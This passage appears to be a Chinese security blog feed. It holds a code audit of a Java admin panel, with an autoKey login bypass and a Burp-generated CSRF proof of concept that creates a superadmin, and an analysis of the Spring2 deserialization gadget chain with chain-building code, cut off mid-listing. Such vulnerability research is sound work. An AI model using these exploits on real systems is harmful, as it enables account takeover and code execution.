class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseModel</span> &#123;<br>String name;<br>String pass;<br><span class="hljs-comment">// 谷歌秘钥</span><br>String key;<br><span class="hljs-comment">// 是否开启谷歌验证</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean auth;<br><br><span class="hljs-comment">// 是否开启api</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean api;<br><br>String token;<br><span class="hljs-comment">// 自动登录key</span><br>String autoKey;<br><br><span class="hljs-comment">// 类型 0 超管 1 受限用户</span><br><span class="hljs-meta">@InitValue(&quot;0&quot;)</span><br>Integer type;<br></code></pre></td></tr></table></figure><p>admin类型里面包含了自动登录key，autoKey。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;LoginController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;autoLogin&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">autoLogin</span><span class="hljs-params">(String autoKey)</span> &#123;<br><br>   <span class="hljs-comment">// 用户名密码</span><br>   <span class="hljs-type">Admin</span> <span class="hljs-variable">admin</span> <span class="hljs-operator">=</span> adminService.getByAutoKey(autoKey);<br>   <span class="hljs-keyword">if</span> (admin != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// 登录成功</span><br>      Context.current().sessionSet(<span class="hljs-string">&quot;localType&quot;</span>, <span class="hljs-string">&quot;local&quot;</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;isLogin&quot;</span>, <span class="hljs-literal">true</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;admin&quot;</span>, admin);<br>      Context.current().sessionRemove(<span class="hljs-string">&quot;imgCode&quot;</span>); <span class="hljs-comment">// 立刻销毁验证码</span><br><br>      <span class="hljs-comment">// 检查更新</span><br>      versionConfig.checkVersion();<br><br>      <span class="hljs-keyword">return</span> renderSuccess(admin);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> renderError();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这个功能点可以直接登录，什么二次验证都不用管。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getByAutoKey</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Admin <span class="hljs-title function_">getByAutoKey</span><span class="hljs-params">(String autoKey)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findOneByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getAutoKey, autoKey), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>就是从数据库取autokey。</p><p>所以以上changePassOver，addOver两个路由，在发送数据包的时候只要autoKey，直接就可以注入到数据库，然后通过autoLogin接口传入autoKey即可通过认证，绕过密码、google认证。</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123151820408.png" alt="image-20231123151820408"></p><p><img src="image-20231123151842991.png" alt="image-20231123151842991"></p><p>提交数据包后，成功注入到数据库</p><p><img src="image-20231123151947661.png" alt="image-20231123151947661"></p><p>然后调用autoLogin接口，即可获取认证。</p><p>修改密码接口</p><p><img src="image-20231123152251366.png" alt="image-20231123152251366"></p><p><img src="image-20231123152310239.png" alt="image-20231123152310239"></p><p>成功注入到数据库</p><p><img src="image-20231123152408162.png" alt="image-20231123152408162"></p><p>然后调用autoLogin接口，即可获取admin认证。</p><h2 id="0x04-csrf创建管理员-全版本"><a href="#0x04-csrf创建管理员-全版本" class="headerlink" title="0x04 csrf创建管理员 (全版本)"></a>0x04 csrf创建管理员 (全版本)</h2><p>com&#x2F;cym&#x2F;model&#x2F;Admin.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseModel</span> &#123;<br>String name;<br>String pass;<br><span class="hljs-comment">// 谷歌秘钥</span><br>String key;<br><span class="hljs-comment">// 是否开启谷歌验证</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean auth;<br><br><span class="hljs-comment">// 是否开启api</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean api;<br><br>String token;<br><span class="hljs-comment">// 自动登录key</span><br>String autoKey;<br><br><span class="hljs-comment">// 类型 0 超管 1 受限用户</span><br><span class="hljs-meta">@InitValue(&quot;0&quot;)</span><br>Integer type;<br></code></pre></td></tr></table></figure><p>admin类型里面包含的字段。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;addOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] parentId)</span> &#123;<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(admin.getId())) &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByName(admin.getName());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByNameWithOutId(admin.getName(), admin.getId());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125;<br><br>adminService.addOver(admin, parentId);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><p>添加用户的路由, 可以控制admin，parentId，admin.getId()是否为空，不为空进入adminService.getCountByName，跟进getCountByName()</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getCountByName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getCountByName</span><span class="hljs-params">(String name)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findCountByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getName, name), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到进行sql查询，查看数据库是否存在用户。不存在此用户就在service层面创建用户，跟进adminService.addOver。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#addOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] groupIds)</span> &#123;<br>sqlHelper.insertOrUpdate(admin);<br><br>sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(AdminGroup::getAdminId, admin.getId()), AdminGroup.class);<br><span class="hljs-keyword">if</span> (admin.getType() == <span class="hljs-number">1</span> &amp;&amp; groupIds != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">for</span> (String id : groupIds) &#123;<br><span class="hljs-type">AdminGroup</span> <span class="hljs-variable">adminGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminGroup</span>();<br>adminGroup.setAdminId(admin.getId());<br>adminGroup.setGroupId(id);<br>sqlHelper.insert(adminGroup);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法直接将admin添加到数据库，deleteByQuery就是根据admin_id删除admin_group的数据，不重要，dmin.getType() &#x3D;&#x3D; 1就是非管理员，管理员的type为0，不会走到这里。</p><p>com&#x2F;cym&#x2F;utils&#x2F;EncodePassUtils.java#encode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encode</span><span class="hljs-params">(String pass)</span> &#123;<br><br><span class="hljs-keyword">if</span> (StrUtil.isNotEmpty(pass)) &#123;<br>pass = SecureUtil.md5(pass) + SecureUtil.md5(defaultPass);<br>&#125;<br><br><span class="hljs-keyword">return</span> pass;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encodeDefaultPass</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> SecureUtil.md5(defaultPass) + SecureUtil.md5(defaultPass);<br>&#125;<br></code></pre></td></tr></table></figure><p>这是pass生成算法。直接调用生成pass添加到Admin。</p><p>由于Admin类型我们可控，所以构建Admin类型的时候，我们传入id，name，pass，type，api即可，然后在写入数据库直接写入账号密码（默认不创建密码，且后续根据id修改密码，id不可控，是一个随机数），所以这里创建好Admin类型，进行csrf即可。</p><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123035053907.png" alt="image-20231123035053907"></p><p>调用算法生成123456对应pass</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56e057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>ec<span class="hljs-number">7231</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>ecd<span class="hljs-number">7</span>fa<span class="hljs-number">89</span>fd<span class="hljs-number">6</span>bae<span class="hljs-number">6e81</span>d<span class="hljs-number">2</span>adc<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>构造csrf数据包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://10.0.0.67:8080/adminPage/admin/addOver&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;api&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;type&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;parentId&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883ec7231c2ecd7fa89fd6bae6e81d2adc80&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>action改为对应的网址，name改为要创建的用户。</p><p>模拟admin用户在线，引导admin用户点击链接</p><p><img src="image-20231123035726533.png" alt="image-20231123035726533"></p><p>点击后成功创建用户</p><p><img src="image-20231123035814882.png" alt="image-20231123035814882"></p><p>成功登陆</p><p><img src="image-20231123040124874.png" alt="image-20231123040124874"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没办法，鉴权做的太好了，只能通过社工来进入后台，后台有命令执行功能点，没什么好审计rce的点，水几个垃圾洞好了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>spring2-gadget</title>
    <link href="/2023/12/14/spring2-gadget/"/>
    <url>/2023/12/14/spring2-gadget/</url>
    
    <content type="html"><![CDATA[<ol><li>依赖版本</li></ol><p>spring-core : 4.1.4.RELEASE<br>spring-aop : 4.1.4.RELEASE<br>jdk 1.7-1.8</p><p>Spring2 在 Spring1 的触发链上有所变换，替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler，使用了 spring-aop 的 JdkDynamicAopProxy ，并完成了后续触发 TemplatesImpl 的流程。</p><h2 id="0x01-MethodInvokeTypeProvider"><a href="#0x01-MethodInvokeTypeProvider" class="headerlink" title="0x01 MethodInvokeTypeProvider"></a>0x01 MethodInvokeTypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.java</p><p>接下来我们从反序列触发点开始分析。</p><p>readObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>inputStream.defaultReadObject();<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);<br><span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="1700938325145-d7d5aee2-c3cf-4343-b7db-dfa471b73006-20231214002318574.png" alt="img"></p><p>先在class找对应的方法，然后使用这个方法。调用的方法只能是无参方法。很容易就想到TemplatesImpl.newTransformer()。也就是办法把methodName改为newTransformer，provider.getType().getClass()要得到TemplatesI。</p><h2 id="0x02-AnnotationInvocationHandler-java"><a href="#0x02-AnnotationInvocationHandler-java" class="headerlink" title="0x02 AnnotationInvocationHandler.java"></a>0x02 AnnotationInvocationHandler.java</h2><p>sun&#x2F;reflect&#x2F;annotation&#x2F;AnnotationInvocationHandler.java</p><p>通过这个AnnotationInvocationHandler.java 动态代理结合interfaces，然后在反射构造函数传入map，map里面包含interfaces里面的方法名，和一个对象(<strong>map(“方法名”，Object)</strong>)，就可以在invocationHandler.invoke()调用时放回这个<strong>Object，</strong>这就是Spring1这条链的精髓所在<strong>。</strong></p><p><img src="1700937893410-8dbc5a8b-7b81-488e-a7fa-7c4c45914c1e-20231214002318581.png" alt="img"></p><p><img src="1700937914135-815c9d15-7551-4c86-afac-96e1bc946ce9-20231214002318564.png" alt="img"></p><p><img src="1700937934220-d58a68a8-ae74-468a-9559-d6af8b456278-20231214002318579.png" alt="img"></p><p>invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>       Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>       <span class="hljs-comment">// Handle Object and Annotation methods</span><br>       <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>           paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>           <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>       <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>       <span class="hljs-keyword">switch</span>(member) &#123;<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>           <span class="hljs-keyword">return</span> toStringImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>           <span class="hljs-keyword">return</span> hashCodeImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>           <span class="hljs-keyword">return</span> type;<br>       &#125;<br><br>       <span class="hljs-comment">// Handle annotation member accessors</span><br>       <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br><br>       <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br><br>       <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>           <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br><br>       <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>           result = cloneArray(result);<br><br>       <span class="hljs-keyword">return</span> result;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="0x03-TypeProvider"><a href="#0x03-TypeProvider" class="headerlink" title="0x03 TypeProvider"></a>0x03 TypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$TypeProvider</p><p><img src="1700938736196-62c5cd98-c206-43cb-9c64-00bb1622fd67-20231214002318577.png" alt="img"></p><p>TypeProvider这个接口刚好有这个方法，可以想到通过AnnotationInvocationHandler.invoke来放回TemplatesI。</p><p>那么就是通过动态代理代理TypeProvider接口，invocationHandler传入AnnotationInvocationHandler，然后通过反射调用构造函数传入map(“geType”，TemplatesI)，在调用接口任意方法就能返回TemplatesI。</p><p>对应的实现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br><br><span class="hljs-comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span><br>HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map2.put(<span class="hljs-string">&quot;getType&quot;</span>, templates);<br><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br><span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br>cons.newInstance(typeProviderProxy,Templates.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>调试</p><p><img src="1700940037452-042b5e6e-7cd4-45dd-b0bc-320413010234-20231214002318610.png" alt="img"></p><p>可以发现成功返回了TemplatesImpl。</p><p>但是为什么没有加载成功defindclass了。</p><p><img src="1700940133796-e76ec26b-1260-4974-9989-eb495f1ccc93-20231214002318593.png" alt="img"></p><p><strong>这里报错需要一个Type，但是TemplatesImpl cannot be cast to java.lang.reflect.Type，我们需要返回type对象，然后这个继续通过动态代理type对象然后返回TemplatesImpl对象。 这样需要一个InvocationHandler接口的实现类，它的invoke需要满足返回需要去触发另一个动态代理去返回TemplatesImpl对象，然后它需要继承Serializable，最好是jdk原生类，或者Spring里面的类。前辈找到了JdkDynamicAopProxy可以满足这个要求。</strong></p><h2 id="0x04-JdkDynamicAopProxy，AdvisedSupport"><a href="#0x04-JdkDynamicAopProxy，AdvisedSupport" class="headerlink" title="0x04 JdkDynamicAopProxy，AdvisedSupport"></a>0x04 JdkDynamicAopProxy，AdvisedSupport</h2><p><strong>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;AdvisedSupport.java</strong></p><p><img src="1701793454923-2ba3c595-5dc3-4fc5-a779-bd46206ed72f.png" alt="img"></p><p>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;AdvisedSupport.java#setTarget（）</p><p><img src="1701793507324-0e71e207-3f9b-4e7e-9e30-79c75a34baa0.png" alt="img"></p><p>也就是通过setTarget对EMPTY_TARGET_SOURCE赋值，从而对targetSource赋值，</p><p><strong>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;JdkDynamicAopProxy.java#invoke()</strong></p><p><img src="1701793156483-92278a73-dacb-4767-a7e5-429b61b83be9.png" alt="img"></p><p>获取 AdvisedSupport 里的 TargetSource，并调用 getTarget() 方法返回其中的对象</p><p><img src="1701793221615-9a34765e-5e44-4207-bbbe-f0acf846a5d5.png" alt="img"></p><p><img src="1701793246108-24036ed5-15ba-487b-a9b7-f6fd50e12827.png" alt="img">调用 AopUtils#invokeJoinpointUsingReflection() 方法反射调用对象的 method 方法并返回。</p><p>方法里就是简单的反射调用。</p><p><img src="1701793361423-7f344a50-8377-43fb-9b20-e9446532f1e7.png" alt="img"></p><p>在看JdkDynamicAopProxy构造函数。</p><p><img src="1701793751706-5ffc8718-c809-4a5e-865c-87b0d632643a.png" alt="img"></p><p>一切都很巧妙。</p><p><strong>总结起来就是先初始化AdvisedSupport，然后把template对象setTarget进去，然后JdkDynamicAopProxy构造函数赋值advised为AdvisedSupport。这样动态代理JdkDynamicAopProxy时，就能触发targetSource.getTarget()，得到template对象。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">      Class&lt;?&gt; Annotation = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>      Constructor&lt;?&gt; annotationDeclaredConstructor = 